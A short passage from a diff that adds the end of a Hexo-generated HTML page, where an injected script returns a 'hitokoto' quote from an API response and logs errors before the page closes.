+      return response.data.hitokoto ;
+    })
+    .catch(function (error) {
+      console.error(error);
+    });
+}
+}}});</script><!-- hexo injector body_end end --></body>
+
+</html>
